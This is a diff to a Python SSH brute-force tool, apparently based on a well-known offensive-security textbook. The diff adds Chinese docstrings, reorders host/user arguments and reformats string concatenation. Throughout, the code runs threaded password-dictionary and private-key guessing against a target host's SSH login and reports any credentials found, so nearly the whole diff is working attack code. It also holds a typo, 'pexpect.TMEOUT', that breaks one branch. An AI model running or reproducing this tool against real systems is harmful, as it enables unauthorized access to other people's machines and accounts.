@@ -21,7 +21,28 @@ PASSWD = None
 CIPHERS = 'aes128-cbc,3des-cbc,aes128-ctr,aes192-ctr,aes256-ctr'
 
 
+def reset():
+    """重置所有信息
+
+    :return:
+    """
+    global Found, Fails
+    global PASSWD, KEYFILE
+    Found = False
+    Fails = 0
+    KEYFILE = None
+    PASSWD = None
+
+
 def connect_with_passwd(host, user, passwd, release):
+    """密码连接ssh
+
+    :param host:目标主机
+    :param user:目标用户
+    :param passwd:测试密码
+    :param release:是否有权释放线程锁
+    :return:
+    """
     global Found, Fails, PASSWD
     s = None
     try:
@@ -50,7 +71,15 @@ def connect_with_passwd(host, user, passwd, release):
             CONNECTION_LOCK.release()
 
 
-def connect_with_key(user, host, keyfile, release):
+def connect_with_key(host, user, keyfile, release):
+    """密钥连接ssh
+
+    :param user: 目标用户名
+    :param host: 目标主机
+    :param keyfile: 密钥文件
+    :param release: 是否有权释放线程锁
+    :return:
+    """
     global Found
     global Fails
     global KEYFILE
@@ -59,7 +88,7 @@ def connect_with_key(user, host, keyfile, release):
         ssh_newkey = 'Are you sure you want to continue'
         conn_closed = 'Connection closed by remote host'
         opt = '-o PasswordAuthentication=no'
-        connect_str = 'ssh '+user+'@'+host+' -i '+keyfile+opt
+        connect_str = 'ssh ' + user + '@' + host + ' -i ' + keyfile + opt
         child = pexpect.spawn(connect_str)
         ret = child.expect([pexpect.TMEOUT, perm_denied, ssh_newkey, conn_closed, '$', '#'])
         if ret == 0 or ret == 1:
@@ -68,7 +97,7 @@ def connect_with_key(user, host, keyfile, release):
         elif ret == 2:
             # print('[-] Adding Host to !/.ssh/known_hosts')
             child.sendline('yes')
-            connect_with_key(user, host, keyfile, False)
+            connect_with_key(host, user, keyfile, False)
         elif ret == 3:
             # print('[-] Connection Closed By Remote Host')
             Fails += 1
@@ -81,7 +110,14 @@ def connect_with_key(user, host, keyfile, release):
             CONNECTION_LOCK.release()
 
 
-def ssh_key(user, host, key_dir):
+def ssh_key(host, user, key_dir):
+    """使用key连接ssh
+
+    :param user: 目标用户
+    :param host: 目标主机
+    :param key_dir: 密钥文件
+    :return:
+    """
     global Found
     global Fails
     threads = []
@@ -91,8 +127,8 @@ def ssh_key(user, host, key_dir):
         if Fails > FAIL_LIMIT:
             break
         fullpath = os.path.join(key_dir, filename)
-        print('[*] Testing keyfile '+str(fullpath))
-        t = Thread(target=connect_with_key, args=(user, host, fullpath, True))
+        print('[*] Testing keyfile ' + str(fullpath))
+        t = Thread(target=connect_with_key, args=(host, user, fullpath, True))
         t.setDaemon(True)
         threads.append(t)
         t.start()
@@ -102,6 +138,13 @@ def ssh_key(user, host, key_dir):
 
 
 def ssh_pass(host, user, passwd_file):
+    """使用密码连接ssh
+
+    :param host: 目标主机
+    :param user: 目标用户
+    :param passwd_file: 密码文件
+    :return:
+    """
     global Found
     global Fails
     threads = []
@@ -113,7 +156,7 @@ def ssh_pass(host, user, passwd_file):
             break
         CONNECTION_LOCK.acquire()
         passwd = line.strip('\r').strip('\n')
-        print('[*] Host:'+host+' Testing: '+str(passwd))
+        print('[*] Host:' + host + ' Testing: ' + str(passwd))
         t = Thread(target=connect_with_passwd, args=(host, user, passwd, True))
         t.setDaemon(True)
         threads.append(t)
@@ -123,16 +166,16 @@ def ssh_pass(host, user, passwd_file):
             t.join()
 
 
-def reset():
-    global Found, Fails
-    global PASSWD, KEYFILE
-    Found = False
-    Fails = 0
-    KEYFILE = None
-    PASSWD = None
-
-
 def brute_ssh(host, user, *, pass_key_dir=None, passwd_file=None, max_connection=None):
+    """ssh爆破函数
+
+    :param host: 目标主机
+    :param user: 目标用户
+    :param pass_key_dir: 密钥文件
+    :param passwd_file: 密码字典文件
+    :param max_connection: 最大连接数
+    :return:
+    """
     if pass_key_dir is None and passwd_file is None:
         print('[-] Wrong parameters.')
 
@@ -147,7 +190,7 @@ def brute_ssh(host, user, *, pass_key_dir=None, passwd_file=None, max_connection
     if pass_key_dir:
         ssh_key(host, user, pass_key_dir)
         if Found:
-            print('[+] Keyfile Found: '+KEYFILE)
+            print('[+] Keyfile Found: ' + KEYFILE)
         elif Fails > FAIL_LIMIT:
             print('[-] Exiting: Too Many Connections Closed By Remote Host.')
             print('[-] Adjust number of simultaneous threads.')
@@ -160,7 +203,7 @@ def brute_ssh(host, user, *, pass_key_dir=None, passwd_file=None, max_connection
     elif passwd_file:
         ssh_pass(host, user, passwd_file)
         if Found:
-            print('[+] '+host+'\'s Password Found: '+PASSWD)
+            print('[+] ' + host + '\'s Password Found: ' + PASSWD)
         elif Fails > FAIL_LIMIT:
             print('[-] Too Many Socket Timeouts Or Could not establish connection to host')
         else:
@@ -173,7 +216,11 @@ def brute_ssh(host, user, *, pass_key_dir=None, passwd_file=None, max_connection
 
 
 def main():
-    parser = optparse.OptionParser('usage %prog '+'-H <target host> -u <user> -F <password list>')
+    """单独调用
+
+    :return:
+    """
+    parser = optparse.OptionParser('usage %prog ' + '-H <target host> -u <user> -F <password list>')
     parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
     parser.add_option('-F', dest='passwdFile', type='string', help='specify password file')
     parser.add_option('-d', dest='passKeyDir', type='string', help='specify directory with keys')
